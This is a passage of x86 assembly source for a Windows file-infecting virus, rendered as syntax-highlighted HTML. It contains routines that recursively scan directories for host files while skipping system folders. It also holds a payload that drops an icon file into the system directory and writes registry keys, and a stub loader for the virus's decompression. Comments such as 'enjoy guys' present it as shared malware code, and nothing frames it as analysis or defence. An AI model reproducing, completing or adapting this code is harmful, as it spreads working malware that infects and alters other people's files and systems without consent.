            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; enjoy guys</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gegenviom</span><span class="sc0">
                
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DropStubLoader</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stubtest</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; this is just for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">FinStub</span><span class="sc4">-</span><span class="sc5">StubLoader</span><span class="sc0">      </span><span class="sc1">; previewving virus</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StubLoader</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; decompression</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stubtest</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">caption</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Host found'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">countcompress</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">countoffset</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">numberloop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FileOffset</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HeaderOffset</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TakenByte</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">finfi</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;   pushad                      ; made for debugging</span><span class="sc0">
</span><span class="sc1">;                           ; purpose</span><span class="sc0">
</span><span class="sc1">;       push    0</span><span class="sc0">
</span><span class="sc1">;   lea eax,dword ptr [ebp+caption]</span><span class="sc0">
</span><span class="sc1">;   push    eax</span><span class="sc0">
</span><span class="sc1">;   lea edx,word ptr [ebp+workingdir]</span><span class="sc0">
</span><span class="sc1">;   push    edx</span><span class="sc0">
</span><span class="sc1">;   push    0</span><span class="sc0">
</span><span class="sc1">;   call    dword ptr [ebp+MessageBoxA]         ; for test</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   mov dword ptr [esp+20h-4],eax</span><span class="sc0">
</span><span class="sc1">;   popad</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Close_file</span><span class="sc0">                 </span><span class="sc1">; close it</span><span class="sc0">

</span><span class="sc5">attackfile2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">willbeback</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; look for next file in sub</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; findnextfilea</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">findnextfileA</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; close find (wow that time,</span><span class="sc0">
                        </span><span class="sc1">; it's not buggy :) </span><span class="sc0">
</span><span class="sc5">finishattack</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">oldesp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">KillSubDir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc12">'TSYS'</span><span class="sc0">     </span><span class="sc1">; don't infect </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishattack</span><span class="sc0">                    </span><span class="sc1">; system directory</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc12">'tsys'</span><span class="sc0">     </span><span class="sc1">; avoiding NT problems</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishattack</span><span class="sc0">                    </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">treeflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">secureit</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc12">'BSYS'</span><span class="sc0">     </span><span class="sc1">; infect sysback</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">finishattack</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc12">'bsys'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">finishattack</span><span class="sc0">

</span><span class="sc5">secureit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc</span><span class="sc0">                   </span><span class="sc1">; alloc memory</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; save precdent dir infos</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pointerdata</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">connectit</span><span class="sc0">               </span><span class="sc1">; put dir name + curr dir status</span><span class="sc0">

</span><span class="sc1">;   pushad</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       push    0</span><span class="sc0">
</span><span class="sc1">;       lea     edx,word ptr [ebp+originaldir]</span><span class="sc0">
</span><span class="sc1">;   push    edx</span><span class="sc0">
</span><span class="sc1">;       lea     edx,word ptr [ebp+originaldir]</span><span class="sc0">
</span><span class="sc1">;   push    edx</span><span class="sc0">
</span><span class="sc1">;   push    0</span><span class="sc0">
</span><span class="sc1">;   call    dword ptr [ebp+MessageBoxA]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   mov dword ptr [esp+20h-4],eax</span><span class="sc0">
</span><span class="sc1">;   popad</span><span class="sc0">


</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Killdir</span><span class="sc0">                 </span><span class="sc1">; scan directory</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; restore back directoy and</span><span class="sc0">
                        </span><span class="sc1">; infos</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delloc</span><span class="sc0">                  </span><span class="sc1">; then delocate</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">makescandir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">makescandir</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'            ; look if it have or not, fix
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">gottaway</span><span class="sc0">                </span><span class="sc1">; it anyway</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">gottaway</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'*.*'</span><span class="sc0">           </span><span class="sc1">; concatenating *.*</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pointerdata</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">checkext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; look for file</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; in the file data</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pointerdata</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">connectit</span><span class="sc0">                   </span><span class="sc1">; we put name on the</span><span class="sc0">
                            </span><span class="sc1">; background file data</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowcaseme</span><span class="sc0">                   </span><span class="sc1">; low case extension</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">treeflag</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">connectit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; add dir</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pointerdata</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; add file data</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">finishmakedir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">finishmakedir</span><span class="sc0">                   </span><span class="sc1">; until we reached end</span><span class="sc0">
                            </span><span class="sc1">; of file name</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">lowcaseme</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; look how much we have</span><span class="sc0">
                            </span><span class="sc1">; to scan</span><span class="sc0">
</span><span class="sc5">lowcaseit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">dontapply</span><span class="sc0">                   </span><span class="sc1">; if between A -&gt; Z</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">                      </span><span class="sc1">; then redesign to </span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">dontapply</span><span class="sc0">                   </span><span class="sc1">; ascii</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">

</span><span class="sc5">dontapply</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">lowcaseit</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">currbuff2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get windows directory</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">scannextz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">scannextz</span><span class="sc0">                       </span><span class="sc1">; look there</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ikxico</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">; then create</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">currbuff2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lcreat</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; SYSDIR\ikx.00</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">dropit</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">trademark</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">766</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lwrite</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; write the icon</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lclose</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; then close the file</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyOne</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">080000000h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Reginitialize</span><span class="sc0">                  </span><span class="sc1">; open the key</span><span class="sc0">
                            </span><span class="sc1">; and write datas</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyZero</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">080000002h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StoorHere</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StoorHere</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mess1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">currbuff2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">finmess1</span><span class="sc4">-</span><span class="sc5">mess1</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy all that over there</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyOne</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">080000000h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Reginitialize</span><span class="sc0">               </span><span class="sc1">; open the key that we had </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StoorHere</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Reginitialize</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rezo21</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; boring to describe</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; look win32.hlp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">002000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; open the key</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">currbuff2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">dodoit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dodoit</span><span class="sc0">
